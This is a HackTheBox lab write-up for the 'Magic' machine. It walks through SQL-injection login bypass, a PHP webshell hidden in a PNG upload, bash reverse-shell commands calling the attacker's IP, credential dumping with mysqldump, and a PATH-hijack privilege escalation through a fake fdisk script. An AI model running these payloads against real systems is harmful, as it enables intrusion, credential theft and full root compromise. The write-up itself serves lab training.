---
icon: ubuntu
---

# Magic - Medium

<figure><img src="../../.gitbook/assets/image (3039).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/magic"><strong>Magic</strong></a></p></figcaption></figure>

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```shellscript
## Nmap TCP
nmap -A -T4 -p- -Pn 10.10.10.185 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-05 12:15 EST
Nmap scan report for 10.10.10.185
Host is up (0.038s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   88.72 ms 10.10.16.1
2   26.15 ms 10.10.10.185
```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (3041).png" alt=""><figcaption></figcaption></figure>

At the bottom there is a link to a Login Page. Clicking Login leads to `/login.php`, with a simple login form

<figure><img src="../../.gitbook/assets/image (3042).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:yellow;">SQLI Login Form</mark>

I tried a few basic logins like admin/admin and magic/magic without luck. I tried a basic SQLi login bypass of username `' or 1=1-- -`, and it logged me in.

This works because the site must be doing something like

{% code overflow="wrap" %}
```sql
SELECT * from users where username = '$username' and password = '$password';
```
{% endcode %}

So my input makes that

{% code overflow="wrap" %}
```shellscript
SELECT * from users where username = '' or 1=1-- -and password = 'admin';
```
{% endcode %}

That satisfies the site’s logic, as it allows me in

#### <mark style="color:yellow;">upload.php</mark>

After logging in we are redirected to upload.php

<figure><img src="../../.gitbook/assets/image (3043).png" alt=""><figcaption></figcaption></figure>

I tried uploading a `.php` shell but I get this message in return.

<figure><img src="../../.gitbook/assets/image (3044).png" alt=""><figcaption></figcaption></figure>

If I try uploading a PHP webshell named `reverse.php` it responds differently

<figure><img src="../../.gitbook/assets/image (3045).png" alt=""><figcaption></figcaption></figure>

If I upload a legitimate image file, at the top left, it reports it’s been uploaded

<figure><img src="../../.gitbook/assets/image (3046).png" alt=""><figcaption></figcaption></figure>

If you go back to `/index.php`, you will find your image there

<figure><img src="../../.gitbook/assets/image (3047).png" alt=""><figcaption></figcaption></figure>

I can view the location of the image, which is `/images/uploads/[name I submitted]`

<figure><img src="../../.gitbook/assets/image (3048).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">PHP RCE Bypassing Magic Bytes and extension Filter</mark>

Based on what we know so far is that the file blocks file extensions and that it might be checking the Magic bytes for the file.&#x20;

We can bypass the Magic Bytes by inserting php code in the middle of the image. As for the extension filter we can bypass this as well by placing `.php` in the middle of the filename

Get a .png file open it in vi and add the following line

{% code overflow="wrap" %}
```php
<?php echo "START<br/><br/>\n\n\n"; system($_GET["cmd"]); echo "\n\n\n<br/><br/>END"; ?>
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3049).png" alt=""><figcaption></figcaption></figure>

I saved that file as `shell.php.png` Now you should be able to upload it

<figure><img src="../../.gitbook/assets/image (3050).png" alt=""><figcaption></figcaption></figure>

Now let's test it, I'l try a simple command first

```shellscript
http://10.10.10.185/images/uploads/shell.php.png?cmd=id
```

<figure><img src="../../.gitbook/assets/image (3051).png" alt=""><figcaption></figcaption></figure>

It worked we see that we have code execution!

I'll use penelope to catch the shell

{% embed url="https://github.com/brightio/penelope" %}

To get a reverse shell via bash:

Note!!! I had to url encode & before to get it working

<pre class="language-shellscript" data-overflow="wrap"><code class="lang-shellscript"><strong>http://10.10.10.185/images/uploads/shell.php.png?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.16.2/443 0>%261'
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (3054).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

### <mark style="color:$primary;">Manual Enumeration as www-data</mark>

<figure><img src="../../.gitbook/assets/image (3057).png" alt=""><figcaption></figcaption></figure>

There is another user on the box besides the root user&#x20;

<figure><img src="../../.gitbook/assets/image (3053).png" alt=""><figcaption></figcaption></figure>

I found some database credentials in the sites web directory. Let's check out the DB

mysql is not on the box, but there are other options. I will use mysqldump

<figure><img src="../../.gitbook/assets/image (3055).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```sql
mysqldump --user=theseus --password=iamkingtheseus --host=localhost Magic
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3056).png" alt=""><figcaption></figcaption></figure>

This tool dumps out SQL such that all the commands are here to rebuild this database. There’s one `INSERT` statement for the `login` table

```sql
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
```

I'll try these credentials for theseus

<figure><img src="../../.gitbook/assets/image (3058).png" alt=""><figcaption></figcaption></figure>

and they work!

### <mark style="color:$primary;">Manual Enumeration as Theseus</mark>

<figure><img src="../../.gitbook/assets/image (3060).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:yellow;">Linpeas</mark>

<figure><img src="../../.gitbook/assets/image (3059).png" alt=""><figcaption></figcaption></figure>

Discovers an interesting SUID, only the users group can execute the SUID but theseus is in the users group so let's check it out

<figure><img src="../../.gitbook/assets/image (3061).png" alt=""><figcaption></figcaption></figure>

the binary prints information about the system

Let's run ltrace on the binary and check to see what calls it makes outside the binary

```shellscript
ltrace sysinfo
```

<figure><img src="../../.gitbook/assets/image (3062).png" alt=""><figcaption></figcaption></figure>

One of the funciton it uses is <mark style="color:$primary;">**popen**</mark>! `popen` is another way to [open a process](https://man7.org/linux/man-pages/man3/popen.3.html) on Linux. The binary is making a call to `fdisk`, however it is doing it without specifying the full path. This leave the binary vulnerable to path hijacking

### <mark style="color:$primary;">Path injection SUID binary Privilege Escalation</mark>

I'll create a reverse shell scrip in /dev/shm

{% code overflow="wrap" %}
```shellscript
echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.16.5/9002 0>&1' > fdisk
```
{% endcode %}

```shellscript
chmod +x fdisk
```

<figure><img src="../../.gitbook/assets/image (3063).png" alt=""><figcaption></figcaption></figure>

Now I’ll update my current path to include `/dev/shm`

```shellscript
export PATH="/dev/shm:$PATH"
```

<figure><img src="../../.gitbook/assets/image (3064).png" alt=""><figcaption></figcaption></figure>

Now when I run `sysinfo`, when it gets to the `fdisk` call it will search for it on the path find it in `/dev/shm` and you will get a shell on your `nc` listener

<figure><img src="../../.gitbook/assets/image (3066).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3065).png" alt=""><figcaption></figcaption></figure>

And we got a shell as the root user!
